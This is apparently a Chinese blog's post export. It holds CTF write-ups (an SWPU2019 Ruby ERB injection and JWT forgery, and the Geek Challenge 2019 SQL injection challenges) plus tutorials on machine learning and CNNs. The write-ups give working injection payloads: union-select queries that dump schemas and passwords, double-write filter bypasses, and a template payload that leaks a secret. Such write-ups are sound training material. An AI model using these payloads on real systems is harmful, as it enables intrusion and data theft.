auth[\"jkl\"].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth ERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result endendpost \"/shop\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } if auth[0][\"jkl\"] &lt; FLAGPRICE then json({title: \"error\",message: \"no enough jkl\"}) else auth &lt;&lt; {flag: ENV[\"FLAG\"]} auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth json({title: \"success\",message: \"jkl is good thing\"}) endenddef islogin if cookies[:auth].nil? then redirect to('/shop') endend 代码是ruby写的，还没学…不过从代码中可以看到出现了JWT，应该跟JWT伪造有关，稍微审一下代码发现jkl指的应该就是金币数量，同uid一起写进了cookie里，抓个包拿jwt解密看看： 可以看到jkl的值为28，也就是现有的金币数，那应该就是要伪造JWT来买到flag了，但是伪造需要SECRET，现在我们并没有，怎么办？ 在/work路由下有这么一段代码： ERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!') 这里我们可以控制，但是只有7个字符，参考题解说是ERB模板注入，这里可以用ruby的预定义字符$对匹配的字符串进行读取，从而获取SECRET，l利用点当然也就在/work路由下了，可以抓包看看： 根据参数构造payload如下： /work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working即/work?SECRET=&amp;name=&lt;%=$'%&gt;&amp;do=&lt;%=$'%&gt; is working 执行结果如下： 拿到SECRET之后，进行JWT伪造： 然后buy flag抓包进行替换即可买到flag： 由响应结果可以看到，已经成功买到了flag，但是响应中并没有啊，因为在代码中可以看到，flag其实被写入到了相应的JWT中，再去解密即可拿到。","link":"/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/"},{"title":"机器学习基本知识","text":"最近由于一些需要在学习机器学习，B站上找了一个系列的视频，感觉还行，对机器学习、深度学习好好学习学习，做一些简单的记录。 机器学习机器学习（Machine Learning, ML）是多领域交叉学科，涉及概率论、统计学、逼近论、凸分析、算法复杂度理论等多门学科。专门研究计算机怎样模拟或实现人类的学习行为，以获取新的知识或者技能，重新组织已有的知识结构使之不断改善自身的性能。机器学习是人工智能的核心，是使计算机具有智能的根本途径，其应用遍及人工智能的各个领域，主要使用归纳、综合而不是演绎。机器学习、机器学习，那么这里的学习到底指什么样的一个过程呢？ 学习：针对经验E和一系列任务T以及一定表现的衡量P，如果随之经验E的积累，针对定义好的任务T可以提高表现P，就说明计算机具有学习能力。 机器学习被这样定义：探究和开发一系列算法来如何使计算机不需要通过外部明显地知识，而可以通过数据进行学习、建模，并且利用建立的模型对新输入的数据进行预测的学科。 当今，机器学习已经广为，现在常见并且火热的应用如下： 语音识别 自动驾驶 语言翻译 计算机视觉 推荐系统 无人机 垃圾邮件识别 一些基本概念机器学习、包括下面提到的深度学习都有自己的一些元素，也算是一些概念，主要是：训练集、测试集、特征值、监督学习、非监督学习、半监督学习、分类、回归。下面对主要概念进行解释： 概念学习：从有关某个布尔函数的输入输出训练样例中推断出该布尔函数，概念定义在实例集合之上；训练集（training set）：又称训练样例，用来训练、产生模型或算法的数据集；测试集（testing set）：又称测试样例，专门用来测试训练好的模型或算法的数据集；特征向量（feature vector）：属性的集合，通常用一个向量来表示，附属于一个实例；标记（label）：实例类别的标记，即结果的类型，包括正例（positive example）和反例（negative example）;分类（classification）：目标标记为类别型数据（category）;回归（regression）：目标标记为连续性数值（continuous numeric value）;有监督学习（supervised learning）：训练集数据有类别标记，即训练集的样例存在最终的结果；无监督学习（unsupervised learning）：训练集数据无类别标记；半监督学习（semi-supervised learning）：训练集数据部分有类别标记、部分没有类别标记。 机器学习步骤 1、把数据集拆分为训练集和测试集 2、用训练集和训练集的特征向量来训练算法 3、用训练出的算法在测试集上进行评估（可能涉及调整参数，用到验证集（parameter set）） 算法评估对一个机器学习算法性能的评估，主要考虑一下五个方面： 1、准确率：执行结果的准确度 2、速度：执行速度的快慢 3、强壮性：数据的个别值缺失时能否对数据进行准确处理 4、可规模性：数据集很大的时候算法是否仍然有效 5、可解释性：算法处理数据的结果可解释的程度 深度学习了解了机器学习的基本知识，再往深里说是深度学习（Deep Learning, DL），它是基于机器学习延伸出的一个新领域，由以人脑结构为启发的神经网络算法（NNs）为起源加之模型结构深度的增加发展，并伴随大数据和计算能力的提高而产生的一系列算法。深度学习被广泛应用于图像处理与计算机视觉、自然语言处理以及语音识别等领域。 对于深度学习，主要对神经网络相关的算法进行学习，这也是目前应用最为广泛的机器学习算法了。 神经网络神经网络（NNs），也称人工神经网络（Artificial Neural Networks，简写为ANNs）或称作连接模型（Connection Model），它是一种模仿动物神经网络行为特征，进行分布式并行信息处理的算法数学模型。这种网络依靠系统的复杂程度，通过调整内部大量节点之间相互连接的关系，从而达到处理信息的目的。 它机器学习得以发展出深度学习的关键所在，以人脑中的神经网络为启发产生的机器学习算法。 多层向前神经网络(Muiltilayer Feed-Forward Neural Network)主要有三部分组成：输入层（input layer），隐藏层（hidden layers），输出层（output layer） 每层由单元（unit，也称为神经元）组成，输入层将训练集的实例特征向量进行传入，经过连接结点的权重（weight）传入下一层，上一层的输出是下一层的输入。隐藏层的数量是任意的，输入层和输出层只有一层，不过一般算层数时不将输入层计算在内。 其工作过程大致是：将输入的实例值进行加权求和，再经过非线性方程转化输出到下一层。理论上讲，当隐藏层足够多、训练集足够大时，可以模拟出任何方程。 设计神经网络结构使用神经网络训练数据之前，必须确定神经网络的层数，以及每层单元的个数。 特征向量在被传入输入层时通常被先标准化（normalize）到0和1之间，目的是加速学习的过程，但是输入的特征值类型可能是离散型的，也可能是连续型的。对于离散型的变量，可以通过编码成每一个输入单元对应一个特征值可能赋的值。例如 特征值A可能取三个值（a0、a1、a2），那么可以使用3个输入单元来表示A。如果A=a0，则表示a0的单元值取1，其余取0；如果A=a1，则表示a1的单元值取1，其余取0。 神经网络既可以解决分类问题，也可以解决回归问题。分类问题即为结果是离散型的问题，比如预测哪个品牌的电脑卖得更好；回归问题即结果是连续型的问题，比如预测某地的房价。分类问题居多，因此主要学习分类问题的解决，对于该类问题，如果是两类，用一个输出单元表示即可，即0和1；多于两类则每一个类别用一个输出单元表示，因此输出层的单元数量通常等于类别的数量。 对于隐藏层数的设置，如果没有明确规则，则可以根据实验测试和误差，以及准确度来实验并作出调整。准确度的测试可以利用测试集来进行测试。不过还有一种常用的测试方法：交叉验证方法。 交叉验证方法（Cross-Validation）将数据集分为n份，第一次将第一份作为测试集其余作为训练集进行训练和测试，第二层选择第二份作为测试集其余作为训练集进行训练和测试，依次类推进行。 Backpropagation算法该算法可以说是其他神经网络算法的基本，通过迭代性的训练集输入来处理训练集中的实例，对比通过神经网络处理后输出层的预测值与训练集真实值之间的差，来反向地以最小化误差调节每个连接之间的权重，以此方式逐渐地进行训练。 算法的要素如下： 输入：数据集D、学习率L、一个多层向前神经网络输出：一个训练好的神经网络起始状态时需要初始化权重、偏向（Bias，每个单元都有一个偏向，相当于上层传到当前结点的一个偏移）：随机初始化值在-1到1之间，或者-0.5到0.5之间。 对于一个训练实例，执行以下步骤： 1、由输入层向前传送，传送时需要对每个单元进行加权，然后加上传入到的目标结点的偏向值，最后对加权值进行非线性的转化，然后传送给下层结点。如下图： 2、根据误差进行反向传送 3、按照上述两步，输出训练集不同的数据进行多次的向前传送和反向传送进行更新，终止条件： 权重的更新低于某个阈值 预测的错误率低于某个阈值 达到预设一定的循环次数 非线性转化方程sigmoid函数（S曲线）用来作为转化方程，sigmoid函数曲线形如下图： 通常有两种：双曲函数和逻辑函数 关于机器学习的知识很多，我主要学习一些神经网络的东西，后面会继续记录。","link":"/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"},{"title":"卷积神经网络CNN入门","text":"本文主要是记录一下对卷积神经网络（CNN）的学习，这是在机器学习，具体来说是深度学习中的第一步，认真学习、好好记录。 CNN曾经被AlphaGo的开发团队用于其开发，从而也一度引起业内人士的青睐，不过有些时候会出现对CNN的盲目崇拜，比如你面试的时候，对面可能会问：你做过机器学习吗？你为什么没有采用CNN算法呢？这可能让人无法回答，其实CNN虽然相对于深度神经网络（DNN）更加简便，效能也很好，不过CNN只是用于图像处理，或者具有与图像处理要素相当的一些问题的处理中，就比如AlphaGo的下围棋，其实就相当于把棋盘当做了图像来进行处理，因此，如果你需要利用神经网络实现某些项目，一定要考虑好它具备与图像处理相当的要素没有。 这里提供一个比较好的学习视频，是李宏毅老师的教学视频。好了，下面进入学习记录了。 卷积神经网络概述卷积神经网络，是深度学习算法应用最成功的领域之一，卷积神经网络包括一维卷积神经网络，二维卷积神经网络以及三维卷积神经网络。一维卷积神经网络主要用于序列类的数据处理，二维卷积神经网络常应用于图像类文本的识别，三维卷积神经网络主要应用于医学图像以及视频类数据识别。 其结构模型如下： 与常规神经网络不同，卷积神经网络的各层中的神经元是3维排列的：宽度、高度和深度。其中的宽度和高度是很好理解的，因为本身卷积就是一个二维模板，但是在卷积神经网络中的深度指的是激活数据体的第三个维度，而不是整个网络的深度，整个网络的深度指的是网络的层数。 卷积神经网络层次卷积神经网络主要由这几类层构成：输入层、卷积层，ReLU层、池化（Pooling）层(有时也称降采样、下采样层)和全连接层（全连接层和常规神经网络中的一样）。通过将这些层叠加起来，就可以构建一个完整的卷积神经网络，如下图： 各层的主要作用如下： 输入层：用于数据的输入； 卷积层：使用卷积核进行特征提取和特征映射； 池化层：进行下采样，对特征图稀疏处理，减少数据运算量； 激励层：由于卷积也是一种线性运算，因此需要增加非线性映射； 全连接层：通常在CNN的尾部进行重新拟合，减少特征信息的损失。 输入层该层除了输入数据，还会对数据进行一些预处理，包括：去均值、归一化、PCA、白化 PCA：是指通过抛弃携带信息量较少的维度，保留主要的特征信J自，来对数据进行降维处理，思路上是使用少数几个有代表性、互不相关的特征来代替原先的..k量的、存在一定相关性的特征，从而加速机器学习进程。PCA可用于特征提取，数据压缩，去噪声，降维等操作。 白化：目的是去掉数据之间的相关联度和令方差均一化，由于图像中相邻像素之间具有很强的相关性，所以用于训练时很多输入是冗余的。这时候去相关的操作就可以采用自化操作，从而使得： 1、减少特征之间的相关性 2、特征具有相同的方差 卷积层卷积层是构建卷积神经网络的核心层，因此该层也是学习的重点。它产生了网络中大部分的计算量，注意是计算量而不是参数量。 卷积层的作用 主要有三点： 滤波器的作用或者说是卷积的作用 卷积层的参数是有一些可学习的滤波器（Filter）集合构成的。每个滤波器在空间上（宽度和高度）都比较小，但是深度和输入数据一致。直观地来说，网络会让滤波器学习到当它看到某些类型的视觉特征时就激活，具体的视觉特征可能是某些方位上的边界，或者在第一层上某些颜色的斑点，甚至可以是网络更高层上的蜂巢状、车轮状的图案。 可以看做神经元的一个输出 神经元只观察输入数据中的一小部分，并且和空间上左右两边的所有神经元共享参数（因为这些数字都是使用同一个滤波器得到的结果）。 减少参数数量 这个由于卷积具有“权值共享”这样的特性，可以降低参数数量，达到降低计算开销，防止由于参数过多而造成过拟合。 感受野 在处理图像这样的高维度输入时，让每个神经元都与前一层中的所有神经元进行全连接是不现实的。而是让每个神经元只与输入数据的一个局部区域连接，该连接的空间大小叫做神经元的感受野（receptive field），它的尺寸是一个超参数（滤波器的空间尺寸）。注意：在深度方向上，这个连接的大小总是和输入的深度相等。 神经元的空间排列 感受野讲解了卷积层中每个神经元与输入数据体之间的连接方式，但是尚未讨论输出数据体中神经元的数量，以及它们的排列方式。3个超参数控制着输出数据体的尺寸：深度（depth），步长（stride）和零填充（zero-padding）： 深度：一个超参数，和使用的滤波器的数量一致，而每个滤波器在输入数据中寻找一些不同的东西，即图像的某些特征。 步长：在滑动滤波器的时候，必须指定步长。当步长为1，滤波器每次移动1个像素；当步长为2，滤波器滑动时每次移动2个像素，依次类推。这个操作会让输出数据体在空间上变小。 零填充：有时候将输入数据体用0在边缘处进行填充是很方便的。零填充的尺寸是一个超参数。它具有一个良好性质，即可以控制输出数据体的空间尺寸（最常用的是用来保持输入数据体在空间上的尺寸，使得输入和输出的宽高都相等）。 输出数据体在空间上的尺寸 W2*H2*D2可以通过输入数据体尺寸W1*H1*D1、卷积层中神经元的感受野尺寸F、步长S、滤波器数量K和零填充的数量P计算输出出来： 注意这些空间排列的超参数之间是相互限制的。举例说来，当输入尺寸W=10，不使用零填充P=0，滤波器尺寸 F=3，此时步长S=2是行不通，因为(W-F+2P)/S+1=(10-3+0)/2+1=4.5，结果不是整数，这就是说神经元不能整齐对称地滑过输入数据体。因此，这些超参数的设定就被认为是无效的，一个卷积神经网络库可能会报出一个错误，通过修改零填充值、修改输入数据体尺寸，或者其他什么措施来让设置合理。合理地设置网络的尺寸让所有的维度都能正常工作，是相当让人头痛的事，而使用零填充和遵守其他一些设计策略将会有效解决这个问题。 权值共享 在卷积层中权值共享是用来控制参数的数量。假如在一个卷积核中，每一个感受野采用的都是不同的权重值（卷积核的值不同），那么这样的网络中参数数量将是十分巨大的。 权值共享是基于这样的一个合理的假设：如果一个特征在计算某个空间位置(x1,y1)(x1,y1)的时候有用，那么它在计算另一个不同位置(x2,y2)(x2,y2)的时候也有用。基于这个假设，可以显著地减少参数数量。换言之，就是将深度维度上一个单独的2维切片看做深度切片（depth slice），比如一个数据体尺寸为[55x55x96]的就有96个深度切片，每个尺寸为[55x55]，其中在每个深度切片上的结果都使用同样的权重和偏差获得的。在这样的参数共享下，假如一个例子中的第一个卷积层有96个卷积核，那么就有96个不同的权重集了，一个权重集对应一个深度切片，如果卷积核的大小是11x11的，图像是RGB3通道的，那么就共有96x11x11x3=34,848个不同的权重，总共有34,944个参数（因为要+96个偏差），并且在每个深度切片中的55x55的结果使用的都是同样的参数。 在反向传播的时候，都要计算每个神经元对它的权重的梯度，但是需要把同一个深度切片上的所有神经元对权重的梯度累加，这样就得到了对共享权重的梯度。这样，每个切片只更新一个权重集。原理如下图： 如上两图所示，左侧的神经元是将每一个感受野展开为一列之后串联起来（就是展开排成一列，同一层神经元之间不连接）。右侧的Deep1i是深度为1的神经元的第i个，Deep2i是深度为2的神经元的第i个，同一个深度的神经元的权值都是相同的，黄色的都是相同的（上面4个与下面4个的参数相同），蓝色也都是相同的。 所以现在回过头来看上面说的卷积神经网络的反向传播公式对梯度进行累加求和也是基于这点考虑（同一深度的不同神经元共用一组参数，所以累加）；而每个切片只更新一个权重集的原因也是这样的，因为从图中可以看到，不同深度的神经元不会公用相同的权重，所以只能更新一个权重集。 注意：如果在一个深度切片中的所有权重都使用同一个权重向量，那么卷积层的前向传播在每个深度切片中可以看做是在计算神经元权重和输入数据体的卷积（这就是“卷积层”名字由来）。这也是为什么总是将这些权重集合称为滤波器（或卷积核（kernel）），因为它们和输入进行了卷积。 注意：有时候参数共享假设可能没有意义，特别是当卷积神经网络的输入图像是一些明确的中心结构时候。这时候我们就应该期望在图片的不同位置学习到完全不同的特征（而一个卷积核滑动地与图像做卷积都是在学习相同的特征）。一个具体的例子就是输入图像是人脸，人脸一般都处于图片中心，而我们期望在不同的位置学习到不同的特征，比如眼睛特征或者头发特征可能（也应该）会在图片的不同位置被学习。在这个例子中，通常就放松参数共享的限制，将层称为局部连接层（Locally-Connected Layer）。 卷积层的超参数及选择 由于参数共享，每个滤波器包含F*F*D1个权重，卷积层一共有F*F*D1*K个权重和K个偏移。在输出数据体中，第d个深度切片（空间尺寸是W2*H2），用第d个滤波器和输入数据进行有效卷积运算的结果（使用步长S），最后在加上第d个偏差。 对这些超参数，常见的设置是F=3，S=1，P=1，F=3，S=1，P=1。 卷积层演示 因为3D数据难以可视化，所以所有的数据（输入数据体是蓝色，权重数据体是红色，输出数据体是绿色）都采取将深度切片按照列的方式排列展现。输入数据体的尺寸是W1=5，H1=5，D1=3，W1=5，H1=5，D1=3，卷积层参数K=2，F=3，S=2，P=1，K=2，F=3，S=2，P=1。就是说，有2个滤波器，滤波器的尺寸是3*33*3，它们的步长是2。因此，输出数据体的空间尺寸是(5−3+2)/2+1=3(5−3+2)/2+1=3。注意输入数据体使用了零填充P=1，所以输入数据体外边缘一圈都是0。下面的例子在绿色的输出激活数据上循环演示，展示了其中每个元素都是先通过蓝色的输入数据和红色的滤波器逐元素相乘，然后求其总和，最后加上偏差得来。 卷积操作形式 卷积操作的形式比较多，这里主要介绍三点：矩阵乘法实现卷积、1*1卷积、扩张卷积。 用矩阵乘法实现卷积 卷积运算本质上就是在滤波器和输入数据的局部区域间做点积。卷积层的常用实现方式就是利用这一点，将卷积层的前向传播变成一个巨大的矩阵乘法。 (1) 输入图像的局部区域被im2coim2col操作拉伸为列。比如输入是[227x227x3]，要与尺寸为11x11x3的滤波器以步长为4进行卷积，就依次取输入中的[11x11x3]数据块，然后将其拉伸为长度为11x11x3=363的列向量。重复进行这一过程，因为步长为4 ，所以经过卷积后的宽和高均为(227-11)/4+1=55，共有55x55=3,025个神经元。因为每一个神经元实际上都是对应有363的列向量构成的感受野，即一共要从输入上取出3025个363维的列向量。所以经过im2col操作得到的输出矩阵的尺寸是[363x3025]，其中每列是拉伸的感受野。注意因为感受野之间有重叠，所以输入数据体中的数字在不同的列中可能有重复。 (2) 卷积层的权重也同样被拉伸成行。举例：如果有96个尺寸为[11x11x3]的滤波器，就生成一个矩阵，尺寸为[96x363]。 (3) 现在卷积的结果和进行一个大矩阵乘法np.dot(Wrow,Xcol)np.dot(Wrow,Xcol)是等价的了，能得到每个滤波器和每个感受野间的点积。在我们的例子中，这个操作的输出是[96x3025]，给出了每个滤波器在每个位置的点积输出。注意其中的np.dotnp.dot计算的是矩阵乘法而不是点积。 (4) 结果最后必须被重新变为合理的输出尺寸[55x55x96]。 这个方法的缺点就是占用内存太多，因为在输入数据体中的某些值在XcolXcol中被复制了多次；优点在于矩阵乘法有非常多的高效底层实现方式。 1*1卷积 具有信号处理专业知识的人刚开始看见这个1*1卷积的时候可能会比较困惑，因为信号是2维的，所以1*1卷积就没有意义。但是，在卷积神经网络中不是这样，因为这里是对3个维度进行操作，滤波器和输入数据体的深度是一样的。比如，如果输入是[32x32x3]，那么1*1卷积就是在高效地进行3维点积（因为输入深度是3个通道）；另外的一种想法是将这种卷积的结果看作是全连接层的一种实现方式，后面讲到全连接层会提到。 扩张卷积 我们前面提到的滤波器都是连续的，但是，让滤波器中元素之间有间隙也是可以的，这就叫做扩张，如图： 在某些设置中，扩张卷积与正常卷积结合起来非常有用，因为这可以在很少的层数内更快地汇集输入图片的大尺度特征。比如，如果上下重叠2个3*3的卷积层，那么第二个卷积层的神经元的感受野是输入数据体中5*5的区域（可以称这些神经元的有效感受野是5*5）。如果我们对卷积进行扩张，那么这个有效感受野就会迅速增长。 至此，对卷积层的学习告一段落，下一层是池化层。 ReLU层也称线性整流层（Rectified Linear Units layer, ReLU layer），使用线性整流函数（Rectified Linear Units, ReLU）f(x)=max(0,x)作为这一层神经的激励函数（Activation function）。它可以增强判定函数和整个神经网络的非线性特性，而本身并不会改变卷积层。 事实上，其他的一些函数也可以用于增强网络的非线性特性，如双曲正切函数 f(x)=tanh(x)、f(x)=|tanh(x)|，或者Sigmoid函数f(x)=(1+e^(-x))^(-1)。相比其它函数来说，ReLU函数更受青睐，这是因为它可以将神经网络的训练速度提升数倍，而并不会对模型的泛化准确度造成显著影响。 池化层通常在连续的卷积层之间会周期性地插入一个池化层（Pooling），它的作用是逐渐降低数据体的空间尺寸，这样的话就能减少网络中参数的数量，使得计算资源耗费变少，也能有效控制过拟合。如下图： 池化层使用MAX操作，对输入数据体的每一个深度切片独立进行操作，改变它的空间尺寸。最常见的形式是使用尺寸2*2的滤波器，以步长为2来对每个深度切片进行降采样，将其中75%的激活信息都丢掉。每个MAX操作是从4个数字中取最大值（也就是在深度切片中某个2*2的区域），深度保持不变。 池化层的计算：输入数据体尺寸W1*H1*D1，有两个超参数：空间大小F和步长S；输出数据体的尺寸W2*H2*D2，其中： 这里面与之前的卷积的尺寸计算的区别主要在于两点：首先在池化的过程中基本不会进行另补充；其次池化前后深度不变。 普通池化（General Pooling）：除了常用的最大池化，池化单元还可以使用其他的函数，比如平均池化（average pooling）或L-2范式池化（L2-norm pooling）。平均池化历史上比较常用，但是现在已经很少使用了。因为实践证明，最大池化的效果比平均池化要好。 反向传播：回顾一下反向传播的内容，其中max(x,y)函数的反向传播可以简单理解为将梯度只沿最大的数回传。因此，在向前传播经过汇聚层的时候，通常会把池中最大元素的索引记录下来（有时这个也叫作道岔（switches）），这样在反向传播的时候梯度的路由就很高效。 不使用池化层：有些时候，被当做图像处理的问题其实也并不完全等同于图像处理，比如AlphaGo的下围棋：棋盘是不能摘除一部分位置进行缩小的，因此也就不能进行池化，事实上AlphaGo也并没有采用池化层。通过在卷积层中使用更大的步长来降低数据体的尺寸。有发现认为有时候，在训练一个良好的生成模型时，弃用汇聚层也是很重要的。比如变化自编码器（VAEs：variational autoencoders）和生成性对抗网络（GANs：generative adversarial networks）。未来的卷积网络结构中，池化层的发展还真不能确定。 全连接层全连接层（简称FC）将每一个结点都与上一层的所有结点相连，用来把前边提取到的特征综合起来。全连接层可以整合卷积层或者池化层中具有类别区分性的局部信息。 为了提升 CNN 网络性能，全连接层每个神经元的激励函数一般采用ReLU函数。最后一层全连接层的输出值被传递给一个输出，可以采用softmax逻辑回归（softmax regression）进行分类，该层也可称为softmax层（softmax laye）。 将卷积层转化为全连接层 对于任一个卷积层，都存在一个能实现和它一样的前向传播函数的全连接层。该全连接层的权重是一个巨大的矩阵，除了某些特定块（感受野），其余部分都是0；而在非0部分中，大部分元素都是相等的（权值共享）。如果把全连接层转化成卷积层，以输出层的Deep11为例，与它有关的输入神经元只有上面四个，所以在权重矩阵中与它相乘的元素，除了它所对应的4个，剩下的均为0，这也就解释了为什么权重矩阵中有为零的部分。另外要把“将全连接层转化成卷积层”和“用矩阵乘法实现卷积”区别开，这两者是不同的，后者本身还是在计算卷积，只不过将其展开为矩阵相乘的形式，并不是”将全连接层转化成卷积层”，所以除非权重中本身有零，否则用矩阵乘法实现卷积的过程中不会出现值为0的权重。 将全连接层转化为卷积层 任何全连接层都可以被转化为卷积层。比如，一个K=4096的全连接层，输入数据体的尺寸是 7*7*5127*7*512，这个全连接层可以被等效地看做一个F=7，P=0，S=1，K=4096，F=7，P=0，S=1，K=4096的卷积层。换句话说，就是将滤波器的尺寸设置为和输入数据体的尺寸设为一致的。因为只有一个单独的深度列覆盖并滑过输入数据体，所以输出将变成1*1*40961*1*4096，这个结果就和使用初始的那个全连接层一样了。这个实际上也很好理解，因为，对于其中的一个卷积滤波器，这个滤波器的的深度为512，也就是说，虽然这个卷积滤波器的输出只有1个，但是它的权重有7*7*5127*7*512，相当于卷积滤波器的输出为一个神经元，这个神经元与上一层的所有神经元相连接，而这样与前一层所有神经元相连接的神经元一共有4096个，这不就是一个全连接网络。 在上述的两种变换中，将全连接层转化为卷积层在实际运用中更加有用。假设一个卷积神经网络的输入是224*224*3的图像，一系列的卷积层和汇聚层将图像数据变为尺寸为7*7*512的激活数据体（在AlexNet中就是这样，通过使用5个汇聚层来对输入数据进行空间上的降采样，每次尺寸下降一半，所以最终空间尺寸为224/2/2/2/2/2=7）。从这里可以看到，AlexNet使用了两个尺寸为4096的全连接层，最后一个有1000个神经元的全连接层用于计算分类评分。我们可以将这3个全连接转化为3个卷积层： (1) 针对第一个连接区域是[7x7x512]的全连接层，令其滤波器尺寸为F=7，这样输出数据体就为[1x1x4096]了。 (2) 针对第二个全连接层，令其滤波器尺寸为F=1，这样输出数据体为[1x1x4096]。 (3) 对最后一个全连接层也做类似的，令其F=1，最终输出为[1x1x1000]。 这样做的目的是让卷积网络在一张更大的输入图片上滑动，得到多个输出，这样的转化可以让我们在单个向前传播的过程中完成上述的操作。 至此，对CNN各层的学习暂时告一段落，最起码有了一定的了解。下面将对各层之间的结构进行学习。 卷积神经网络结构特点卷积神经网络通常是由三种层构成：卷积层，池化层（除非特别说明，一般就是最大值池化）和全连接层。ReLU层通常在卷积层之后，它逐元素地进行激活函数操作，常常将它与卷积层看作是同一层。 层的排列规律卷积神经网络最常见的形式就是将一些卷积层和ReLU层放在一起，其后紧跟池化层，然后重复如此直到图像在空间上被缩小到一个足够小的尺寸，在某个地方过渡成成全连接层也较为常见。最后的全连接层得到输出，比如分类评分等。换句话说，最常见的卷积神经网络结构如下： 其中*指的是重复次数，POOL?指的是一个可选的池化层。其中N&gt;=0,通常N&lt;=3，M&gt;=0，K&gt;=0，K&lt;3。例如，下面是一些常见的网络结构规律： INPUT -&gt; FC ：实现一个线性分类器，此处N = M = K = 0； INPUT -&gt; CONV -&gt; RELU -&gt; FC：单层的卷积神经网络； INPUT -&gt; [CONV -&gt; RELU -&gt; POOL]*2 -&gt; FC -&gt; RELU -&gt; FC：此处在每个汇聚层之间有一个卷积层，这种网络就是简单的多层的卷积神经网络； INPUT -&gt; [CONV -&gt; RELU -&gt; CONV -&gt; RELU -&gt; POOL]*3 -&gt; [FC -&gt; RELU]*2 -&gt; FC：此处每个汇聚层前有两个卷积层，这个思路适用于更大更深的网络，因为在执行具有破坏性的汇聚操作前，多重的卷积层可以从输入数据中学习到更多的复杂特征。 卷积层的大小选择几个小滤波器卷积层的组合比一个大滤波器卷积层好。假设你一层一层地重叠了3个3*3的卷积层（层与层之间有ReLU激活函数）。在这个排列下，第一个卷积层中的每个神经元都对输入数据体有一个3*3的视野。第二个卷积层上的神经元对第一个卷积层有一个3*3的视野，也就是对输入数据体有5*5的视野。同样，在第三个卷积层上的神经元对第二个卷积层有3*3的视野，也就是对输入数据体有7*7的视野。 假设不采用这3个3*3的卷积层，而是使用一个单独的有7*7的感受野的卷积层，那么所有神经元的感受野也是7*7。多个卷积层与非线性的激活层交替的结构，比单一卷积层的结构更能提取出深层的更好的特征。但是也会有一些缺点，假设所有的数据有C个通道，那么单独的7*7卷积层将会包含C*(7*7*C)=49C^2个参数，而3个3*3的卷积层的组合仅有3*(C*(3*3*C))=27C^2个参数 直观说来，最好选择带有小滤波器的卷积层组合，而不是用一个带有大的滤波器的卷积层。前者可以表达出输入数据中更多个强力特征，使用的参数也更少。唯一的不足是，在进行反向传播时，中间的卷积层可能会导致占用更多的内存。 层的尺寸设置各层常见的尺寸设置如下： 输入层：应该能被2整除很多次。常用数字包括32，64，96或224（比如ImageNet卷积神经网络），384和512。 卷积层：应该使用小尺寸滤波器（比如3*3或最多5*5），使用步长S=1。还有一点非常重要，就是对输入数据进行零填充，这样卷积层就不会改变输入数据在空间维度上的尺寸。比如，当F=3，那就使用P=1来保持输入尺寸。当F=5，P=2，一般对于任意F，当P=(F-1)/2的时候能保持输入尺寸。如果必须使用更大的滤波器尺寸（比如7*7之类），通常只用在第一个面对原始图像的卷积层上。 池化层：负责对输入数据的空间维度进行降采样。最常用的设置是用2*2感受野（即F=2）的最大值池化，步长为S=2。注意这一操作将会把输入数据中75%的激活数据丢弃（因为对宽度和高度都进行了2的下采样）。另一个不那么常用的设置是使用3*3的感受野，步长为2。最大值池化的感受野尺寸很少有超过3的，因为池化操作过度，易造成数据信息丢失，这通常会导致算法性能变差。 至此，对卷积神经网络的学习到此告一段落，很多深层次的地方其实还没搞懂，在以后的实践中再加深学习吧。 参考：卷积神经网络入门详解李宏毅机器学习教学视频","link":"/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"极客大挑战题目解析","text":"这里是极客大挑战五个sql注入题目的解析合集，都是常用的注入姿势，入门到基础级的。 [极客大挑战 2019]EasySQL万能密码登录管理员账户即可，这里注意一下，万能密码用的时候注意是字符型还是整形，这个题是字符型，即： -1' or '1'='1 如果是整形，则用万能密码： -1' or 1=1 万能密码还有很多，可以参考网上的信息，这里有一个：https://www.cnblogs.com/pass-A/p/11134988.html [极客大挑战 2019]LoveSQL考察常见的万能密码登录以及union select注入 题目分析进入题目看到是一个登录框，经过尝试发现字符型的万能密码1' or '1'='1可以登录，并且在username和password处都存在注入点，然后进行常规的注入就行了。 解题爆库： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(schema_name)+from+information_schema.schemata%23 爆表名： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(table_name)+from+information_schema.tables%20where%20table_schema%3Ddatabase()%20%23 可以看到一个表名l0ve1ysq1，flag应该在其中，那么就看一下这个表包含的列爆列名： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D'l0ve1ysq1'%20%23 看到存在password列，flag应该在其中查字段： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(password)%20from%20l0ve1ysq1%23 如图，成功拿到flag。 [极客大挑战 2019]BabySQL考察双写绕过 题目分析在登陆窗口，利用万能密码的时候直接1' or '1'='1发现不行，但是1' oorr '1'='1可以，由此猜测考察双写绕过。通过测试发现了or、from、union、select、where被替换为空了，因此需要利用双写绕过。 解题首先利用双写爆库： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23 然后爆表名： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23 爆列名： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3D'b4bsql'%23 拿flag： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 